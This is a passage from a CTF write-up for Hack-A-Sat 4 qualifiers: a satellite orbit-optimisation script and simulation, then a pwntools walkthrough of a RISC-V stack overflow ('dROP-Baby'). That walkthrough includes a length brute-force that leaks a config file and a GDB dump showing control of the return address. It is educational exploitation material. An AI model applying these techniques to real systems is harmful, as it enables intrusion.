</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Mean motion (revs/day):&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>mean_motion</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># read new score</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Your orbit achieved &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>line</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=kc>False</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>	<span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;BRUCIA!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>new_score</span> <span class=o>=</span> <span class=o>-</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s2>&#34;New Score: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>new_score</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1># generate random variations, we also used a version of the script which generated 100 variations and didn&#39;t use a mask to choose which parameters to change</span>
</span></span><span class=line><span class=cl>        <span class=c1># also we had a version with local testing and multithreading :)</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>rnd</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>63</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>new_tuple</span> <span class=o>=</span> <span class=p>[</span><span class=n>inclination</span><span class=p>,</span> <span class=n>raan</span><span class=p>,</span> <span class=n>eccentricity</span><span class=p>,</span> <span class=n>arg_perigee</span><span class=p>,</span> <span class=n>mean_anomaly</span><span class=p>,</span> <span class=n>mean_motion</span><span class=p>]</span>
</span></span><span class=line><span class=cl>		<span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>bit</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>rnd</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>6</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>			<span class=n>new_tuple</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>new_tuple</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span> <span class=o>*</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=o>-</span><span class=mi>500</span><span class=p>,</span> <span class=mi>500</span><span class=p>)</span> <span class=o>*</span> <span class=n>DELTA</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>heappush</span><span class=p>(</span><span class=n>pq</span><span class=p>,</span> <span class=nb>tuple</span><span class=p>([</span><span class=n>new_score</span><span class=p>]</span> <span class=o>+</span> <span class=n>new_tuple</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>The local simulation script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>skyfield.api</span> <span class=kn>import</span> <span class=n>load</span><span class=p>,</span> <span class=n>wgs84</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>IPython</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>Name                 Lat (deg)      Long (deg)       Alt (m)
</span></span></span><span class=line><span class=cl><span class=s1>Cape Canaveral       28.40         -80.61             27
</span></span></span><span class=line><span class=cl><span class=s1>Cape Cod             41.70         -70.03              9
</span></span></span><span class=line><span class=cl><span class=s1>Anchorage            61.21        -149.90             40
</span></span></span><span class=line><span class=cl><span class=s1>Vandenberg           34.76        -120.52            122
</span></span></span><span class=line><span class=cl><span class=s1>Denver               39.74        -104.98           1594
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>eph</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=s2>&#34;de421.bsp&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>earth</span> <span class=o>=</span> <span class=n>eph</span><span class=p>[</span><span class=s1>&#39;Earth&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>stations</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Cape Canaveral&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>28.40</span><span class=p>,</span> <span class=o>-</span><span class=mf>80.61</span><span class=p>,</span> <span class=mi>27</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Cape Cod&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>41.70</span><span class=p>,</span>  <span class=o>-</span><span class=mf>70.03</span><span class=p>,</span> <span class=mi>9</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Anchorage&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>61.21</span><span class=p>,</span> <span class=o>-</span><span class=mf>149.90</span><span class=p>,</span> <span class=mi>40</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Vandenberg&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>34.76</span><span class=p>,</span> <span class=o>-</span><span class=mf>120.52</span><span class=p>,</span> <span class=mi>122</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Denver&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>39.74</span><span class=p>,</span> <span class=o>-</span><span class=mf>104.98</span><span class=p>,</span> <span class=mi>1594</span><span class=p>),</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>stations_eph</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Cape Canaveral&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>28.40</span><span class=p>,</span> <span class=o>-</span><span class=mf>80.61</span><span class=p>,</span> <span class=mi>27</span><span class=p>)</span> <span class=o>+</span> <span class=n>earth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Cape Cod&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>41.70</span><span class=p>,</span>  <span class=o>-</span><span class=mf>70.03</span><span class=p>,</span> <span class=mi>9</span><span class=p>)</span> <span class=o>+</span> <span class=n>earth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Anchorage&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>61.21</span><span class=p>,</span> <span class=o>-</span><span class=mf>149.90</span><span class=p>,</span> <span class=mi>40</span><span class=p>)</span> <span class=o>+</span> <span class=n>earth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Vandenberg&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>34.76</span><span class=p>,</span> <span class=o>-</span><span class=mf>120.52</span><span class=p>,</span> <span class=mi>122</span><span class=p>)</span> <span class=o>+</span> <span class=n>earth</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Denver&#34;</span><span class=p>:</span> <span class=n>wgs84</span><span class=o>.</span><span class=n>latlon</span><span class=p>(</span><span class=mf>39.74</span><span class=p>,</span> <span class=o>-</span><span class=mf>104.98</span><span class=p>,</span> <span class=mi>1594</span><span class=p>)</span> <span class=o>+</span> <span class=n>earth</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secs</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ts</span> <span class=o>=</span> <span class=n>load</span><span class=o>.</span><span class=n>timescale</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>t0</span> <span class=o>=</span> <span class=n>ts</span><span class=o>.</span><span class=n>utc</span><span class=p>(</span><span class=mi>2023</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t1</span> <span class=o>=</span> <span class=n>ts</span><span class=o>.</span><span class=n>utc</span><span class=p>(</span><span class=mi>2023</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sat</span> <span class=o>=</span> <span class=n>load</span><span class=o>.</span><span class=n>tle_file</span><span class=p>(</span><span class=s2>&#34;tle.txt&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>secs</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>t0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span> <span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=mi>60</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>t</span> <span class=o>+</span> <span class=mi>1</span><span class=o>/</span><span class=p>(</span><span class=mi>24</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>stations</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>difference</span> <span class=o>=</span> <span class=n>sat</span> <span class=o>-</span> <span class=n>stations</span><span class=p>[</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>topocentric</span> <span class=o>=</span> <span class=n>difference</span><span class=o>.</span><span class=n>at</span><span class=p>(</span><span class=n>t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>alt</span><span class=p>,</span> <span class=n>az</span><span class=p>,</span> <span class=n>distance</span> <span class=o>=</span> <span class=n>topocentric</span><span class=o>.</span><span class=n>altaz</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>distance</span><span class=o>.</span><span class=n>km</span> <span class=o>&lt;</span> <span class=mi>300</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;BRUCIA&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>alt</span><span class=o>.</span><span class=n>degrees</span> <span class=o>&gt;</span> <span class=mi>15</span> <span class=ow>and</span> <span class=n>distance</span><span class=o>.</span><span class=n>km</span> <span class=o>&lt;</span> <span class=mi>6000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>secs</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>k</span><span class=si>}</span><span class=s2>: Alt: </span><span class=si>{</span><span class=n>alt</span><span class=si>}</span><span class=s2>, Dist: </span><span class=si>{</span><span class=n>distance</span><span class=o>.</span><span class=n>km</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Total sec: </span><span class=si>{</span><span class=n>secs</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></div><h2 class="relative group">dROP-Baby<div id=drop-baby class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#drop-baby aria-label=Anchor>#</a></span></h2><h3 class="relative group">The challenge<div id=the-challenge-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-challenge-1 aria-label=Anchor>#</a></span></h3><p><strong>Category</strong>: &ldquo;Pure Pwnage&rdquo;</p><p><strong>Summary</strong>: Stack overflow which leads to a ROP on RISC-V/32 architecture</p><h4 class="relative group">Description<div id=description-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#description-1 aria-label=Anchor>#</a></span></h4><p>This is a variation of the Smash-RiscV challenge, but the stack is not marked as executable, and there is a hidden configuration that leads to a stack overflow</p><blockquote><p><strong>NOTE</strong>: you should have <code>gdb-multiarch</code> and <code>qemu-riscv32</code> installed</p></blockquote><h4 class="relative group">Python Setup<div id=python-setup class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#python-setup aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./drop-baby&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;riscv&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>bits</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># context.binary = exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>file drop-baby
</span></span></span><span class=line><span class=cl><span class=s2>target remote localhost:1234
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;drop.quals2023-kah5Aiv9.satellitesabove.me&#34;</span><span class=p>,</span> <span class=mi>5300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ticket{golf366979sierra4:GHAZFC9h62tmeRLKrH7JlpRnLQFEWH0TU6xmyKtehG8X8rjRbnOSYab8ZO3iwQTkTg}&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;tmux splitw -h gdb-multiarch -ex init-gef -x .gdbrun&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=s2>&#34;qemu-riscv32&#34;</span><span class=p>,</span> <span class=s2>&#34;-g&#34;</span><span class=p>,</span> <span class=s2>&#34;1234&#34;</span><span class=p>,</span> <span class=s2>&#34;drop-baby&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;FLAG&#34;</span><span class=p>:</span> <span class=s2>&#34;flag</span><span class=si>{REDACTED}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;TIMEOUT&#34;</span><span class=p>:</span> <span class=s2>&#34;999999999&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>io</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h4 class="relative group">How the binary works<div id=how-the-binary-works class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#how-the-binary-works aria-label=Anchor>#</a></span></h4><p>In brief, the binary emulates a satellite that receives a message and sends a response. Firstly, the binary loads the timeout and flag from the environment variables. If the timeout is not present, 10 seconds is set as the default value. If the flag is not present, the program won&rsquo;t start. The main portion of the code comes after, where we can see some configuration being loaded from <code>server.ini</code> and a loop that synchronizes the connection and reads a message from it. The <code>loadINI("server.ini")</code> function simply reads the <code>server.ini</code> file, parses the format, and loads the actual configuration into memory. <code>synchronize()</code> function discards all the remaining bytes until it encounters the sequence <code>\xde\xad\xbe\xef</code>.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt srcset="/img/has4quals_writeups/drop01_hu_b977619ac618be1a.png 330w,
/img/has4quals_writeups/drop01_hu_867e65332eaf6282.png 660w,
/img/has4quals_writeups/drop01_hu_894efa81f20c7f6d.png 1280w" data-zoom-src=/img/has4quals_writeups/drop01.png src=/img/has4quals_writeups/drop01.png></figure></p><p>Here, we can see the <code>read_message()</code> function. In brief, it checks the next byte after <code>\xde\xad\xbe\xef</code> and executes different functions depending on the byte that we send. Here is where the configuration is used. These values are actually used to determine the length of the message to be received, which is different depending on the type of message that we are sending (&lsquo;a1&rsquo;, &lsquo;a2&rsquo;, &lsquo;b1&rsquo;, &lsquo;b2&rsquo;). Every message has to be of the length specified in the corresponding configuration minus 4 (space left for the <code>crc32</code>), and have a <code>crc32</code> of the message at the end; otherwise, it shall close the connection. Note that the message is read and written onto the stack, and <u>the maximum space allocated is 100</u>. Since the configuration is not checked a value greater than 100 may lead to an overflow</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt srcset="/img/has4quals_writeups/drop02_hu_ee8dd039cad3d34a.png 330w,
/img/has4quals_writeups/drop02_hu_b12731e6f48ffbe3.png 660w,
/img/has4quals_writeups/drop02_hu_664e8f18fc56659d.png 1280w" data-zoom-src=/img/has4quals_writeups/drop02.png src=/img/has4quals_writeups/drop02.png></figure></p><h3 class="relative group">Solution<div id=solution-1 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-1 aria-label=Anchor>#</a></span></h3><p>The interesting part is that we do not have the <code>server.ini</code> file, but we can retrieve it by using the command <code>b1</code>. Therefore, we must guess the random configuration for that specific command. To print it, as already mentioned, we have to send a message with the <code>crc32</code> appended at the end, with the length specified in the configuration. But since we do not have that file, we can just send <code>b1</code> messages with increasing length until the configuration is printed.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt srcset="/img/has4quals_writeups/drop03_hu_ffdc24dc9d2acf89.png 330w,
/img/has4quals_writeups/drop03_hu_a9f7580ffc473e52.png 660w,
/img/has4quals_writeups/drop03_hu_30d3ac54566f54c3.png 1280w" data-zoom-src=/img/has4quals_writeups/drop03.png src=/img/has4quals_writeups/drop03.png></figure></p><p>Here is a simple script to get the <code>server.ini</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>start</span><span class=p>()</span> <span class=k>as</span> <span class=n>io</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># synchronize</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print configuration</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb1</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;?&#34;</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>zlib</span><span class=o>.</span><span class=n>crc32</span><span class=p>(</span><span class=n>msg</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>recvd</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s2>&#34;Config Table&#34;</span> <span class=ow>in</span> <span class=n>recvd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>recvd</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>    Baby<span class=err>&#39;</span>s Second RISC-V Stack Smash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    No free pointers this <span class=nb>time</span> and pwning might be more difficult!
</span></span><span class=line><span class=cl>    Exploit me!
</span></span><span class=line><span class=cl>             Config Table
</span></span><span class=line><span class=cl>    ------------------------------
</span></span><span class=line><span class=cl>    <span class=p>|</span>Application Name : Baby dROP<span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      A1_MSG_LEN : <span class=m>40</span>       <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      A2_MSG_LEN : <span class=m>10</span>       <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      B1_MSG_LEN : <span class=m>20</span>       <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      B2_MSG_LEN : <span class=m>300</span>      <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      CC_MSG_LEN : <span class=m>25</span>       <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>      ZY_MSG_LEN : <span class=m>0</span>        <span class=p>|</span>
</span></span><span class=line><span class=cl>    <span class=p>|</span>   SILENT_ERRORS : TRUE     <span class=p>|</span>
</span></span><span class=line><span class=cl>    ------------------------------
</span></span></code></pre></div><p>Here we can see that <code>B2_MSG_LEN</code> is set to 300. As already mentioned, this leads to a stack overflow since the maximum size for a message should be 100.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt srcset="/img/has4quals_writeups/drop04_hu_dda833acf524748a.png 330w,
/img/has4quals_writeups/drop04_hu_6790c30a086c0501.png 660w,
/img/has4quals_writeups/drop04_hu_c5d4174b20c5c3c3.png 1280w" data-zoom-src=/img/has4quals_writeups/drop04.png src=/img/has4quals_writeups/drop04.png></figure></p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt srcset="/img/has4quals_writeups/drop05_hu_3a582aa55505ac09.png 330w,
/img/has4quals_writeups/drop05_hu_298e70f9ed1f8f4.png 660w,
/img/has4quals_writeups/drop05_hu_5a507648e1afb02b.png 1280w" data-zoom-src=/img/has4quals_writeups/drop05.png src=/img/has4quals_writeups/drop05.png></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>[</span> Legend: Modified register <span class=p>|</span> Code <span class=p>|</span> Heap <span class=p>|</span> Stack <span class=p>|</span> String <span class=o>]</span>
</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
</span></span><span class=line><span class=cl><span class=nv>$zero</span>: 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$ra</span>  : 0x62616165  →  0x62616165
</span></span><span class=line><span class=cl><span class=nv>$sp</span>  : 0x40800d90  →  0x62616166  →  0x62616166
</span></span><span class=line><span class=cl><span class=nv>$gp</span>  : 0x0006ea84  →  0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$tp</span>  : 0x000724e0  →  0x0006dd50  →  0x0006b998  →  0x0004fda4  →  0x00000043  →  0x00000043
</span></span><span class=line><span class=cl><span class=nv>$t0</span>  : 0x00000001  →  0x00000001
</span></span><span class=line><span class=cl><span class=nv>$t1</span>  : 0x19999999  →  0x19999999
</span></span><span class=line><span class=cl><span class=nv>$t2</span>  : 0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$fp</span>  : 0x62616164  →  0x62616164
</span></span><span class=line><span class=cl><span class=nv>$s1</span>  : 0x00000001  →  0x00000001
</span></span><span class=line><span class=cl><span class=nv>$a0</span>  : 0xffffffff
</span></span><span class=line><span class=cl><span class=nv>$a1</span>  : 0x40800d18  →  0x61616161  →  0x61616161
</span></span><span class=line><span class=cl><span class=nv>$a2</span>  : 0x00000128  →  0x00000128
</span></span><span class=line><span class=cl><span class=nv>$a3</span>  : 0x00002000  →  0x00002000
</span></span><span class=line><span class=cl><span class=nv>$a4</span>  : 0xffffffff
</span></span><span class=line><span class=cl><span class=nv>$a5</span>  : 0xffffffff
</span></span><span class=line><span class=cl><span class=nv>$a6</span>  : 0x00073d03  →  0x00000000  →  0x00000000
</span></span><span class=line><span class=cl><span class=nv>$a7</span>  : 0x0000003f  →  0x0000003f
</span></span><span class=line><span class=cl><span class=nv>$s2</span>  : 0x00000001  →  0x00000001
</span></span><span class=line><span class=cl><span class=nv>$s3</span>  : 0x40800f04  →  0x40800fbe  →  0x706f7264  →  0x706f7264
